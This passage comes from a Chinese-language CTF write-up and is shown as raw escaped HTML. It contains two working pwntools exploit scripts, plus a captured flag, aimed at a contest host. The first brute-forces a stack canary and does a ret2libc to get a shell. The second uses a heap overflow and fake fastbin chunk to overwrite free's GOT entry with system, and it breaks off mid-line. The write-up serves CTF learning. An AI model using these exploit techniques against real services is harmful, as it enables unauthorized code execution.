 &lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; LibcSearcher &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#r = process(&amp;#x27;./brute&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r=remote(&lt;span class=&#34;string&#34;&gt;&amp;#x27;1.15.81.218&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;20000&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;canary = &lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;find&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; canary,r&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;#r = process(&amp;#x27;./brute&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r=remote(&lt;span class=&#34;string&#34;&gt;&amp;#x27;1.15.81.218&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;20000&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(r.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;2021!\n&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    canary = &lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0x100&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            r.send(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;100&lt;/span&gt; + canary + &lt;span class=&#34;built_in&#34;&gt;bytes&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(i).encode()))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            a = r.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;2021!\n&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;b&amp;#x27;Successfully&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; a:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                canary += &lt;span class=&#34;built_in&#34;&gt;bytes&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(i).encode())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(canary)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(canary)!=&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        find()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;find()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(canary)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./brute&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system = elf.plt[&lt;span class=&#34;string&#34;&gt;&amp;#x27;system&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_got = elf.got[&lt;span class=&#34;string&#34;&gt;&amp;#x27;puts&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_plt = elf.plt[&lt;span class=&#34;string&#34;&gt;&amp;#x27;puts&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;main = &lt;span class=&#34;number&#34;&gt;0x08048560&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p1 = &lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;100&lt;/span&gt; + canary +&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;+ p32(puts_plt) + p32(main) + p32(puts_got)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#print(r.recvuntil(b&amp;#x27;2021!\n&amp;#x27;))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.sendline(p1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_addr = u32(r.recv()[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;puts_addr:&amp;#x27;&lt;/span&gt;,puts_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = LibcSearcher(&lt;span class=&#34;string&#34;&gt;&amp;#x27;puts&amp;#x27;&lt;/span&gt;,puts_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;base = puts_addr - libc.dump(&lt;span class=&#34;string&#34;&gt;&amp;#x27;puts&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sys_addr = base + libc.dump(&lt;span class=&#34;string&#34;&gt;&amp;#x27;system&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bin_sh = base + libc.dump(&lt;span class=&#34;string&#34;&gt;&amp;#x27;str_bin_sh&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p2 = &lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;100&lt;/span&gt; + canary +&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;+ p32(sys_addr) +  &lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; + p32(bin_sh)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.sendline(p2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 爆破好慢...&lt;br /&gt;
CUMTCTF{5305918b-e080-4f2d-b9b1-8a6f3ed727d5&lt;/p&gt;
&lt;h3 id=&#34;pwn4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#pwn4&#34;&gt;#&lt;/a&gt; pwn4&lt;/h3&gt;
&lt;p&gt;edit 的地方有个堆溢出漏洞&lt;/p&gt;
&lt;p&gt;l33t 是后门函数，想要触发需要使位于 bss 的 (unsigned __int64) magic &amp;gt; 0x1305&lt;/p&gt;
&lt;p&gt;unsorted bin attack，修改 magic 的值为 unsorted bin 的地址，可以使 magic &amp;gt; 0x1305&lt;/p&gt;
&lt;p&gt;...&lt;/p&gt;
&lt;p&gt;被坑了。。。&lt;/p&gt;
&lt;p&gt;竟然不是这个目录。。。。。。。。。。。&lt;/p&gt;
&lt;p&gt;然后打算修改一下 system 指令的字符串，发现这个字符串被存在 rodata，只读&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://res.cloudinary.com/sycamore/image/upload/v1682435338/Typera/2023/04/4c2f5f1d77fee1973ed990605f1b4cee.png&#34; alt=&#34;image-20230425230855187&#34; /&gt;&lt;/p&gt;
&lt;p&gt;只能重新搞&lt;/p&gt;
&lt;p&gt;想办法控制 heaparray，&lt;/p&gt;
&lt;p&gt;用 fake chunk 修改 heaparray [0] 为 free_got 的地址，然后用 edit () 修改 free_got 为 system 的地址&lt;/p&gt;
&lt;p&gt;接下来就 free 掉一个存了 /bin/sh\x00 的 chunk，这样就可以 getshell 了，这个可以事先创建好这样的一个 chunk 来实现，然后用 delete_heap 调用 free&lt;/p&gt;
&lt;p&gt;fake chunk 的话，可以再搞两个 chunk，free 第一个 chunk，然后修改另一个造成堆溢出来修改第一个 chunk 的 fd 指针，使其指向 fake chunk&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#r=process(&amp;quot;./pwn4&amp;quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r=remote(&lt;span class=&#34;string&#34;&gt;&amp;#x27;1.15.81.218&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;10003&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf=ELF(&lt;span class=&#34;string&#34;&gt;&amp;quot;./pwn4&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;heaparray=&lt;span class=&#34;number&#34;&gt;0x006020E0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_fastbin=&lt;span class=&#34;number&#34;&gt;0x6020ad&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system_addr=&lt;span class=&#34;number&#34;&gt;0x400C2C&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free_got=elf.got[&lt;span class=&#34;string&#34;&gt;&amp;quot;free&amp;quot;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;create&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;size,content&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;Your choice :&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;Size of Heap : &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(size))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;Content of heap:&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendline(content)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;SuccessFul&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;delete&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;index&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;Your choice :&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;Index :&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(index))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;Done !&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;edit&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;index,size,content&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;Your choice :&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;Index :&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(index))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;Size of Heap : &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(size))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;Content of heap : &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendline(content)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;Done !&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;create(&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# idx0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;create(&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# idx1  &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;create(&lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;b&amp;#x27;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# idx2 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;create(&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;/bin/sh\x00&amp;#x27;&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# id3 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;delete(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt; * &lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt; + p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) + p64(&lt;span class=&#34;number&#34;&gt;0x71&lt;/span&gt;) + p64(&lt;span class=&#34;number&#34;&gt;0x6020ad&lt;/span&gt;) + p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;create(&lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;d&amp;#x27;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# idx1  &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=&lt;span class=&#34;number&#34;&gt;0x23&lt;/span&gt; * &lt;span class=&#34;string&#34;&gt;b&amp;#x27;e&amp;#x27;&lt;/span&gt; + p64(free_got)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;create(&lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;,p)  &lt;span class=&#34;comment&#34;&gt;# idx4 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span 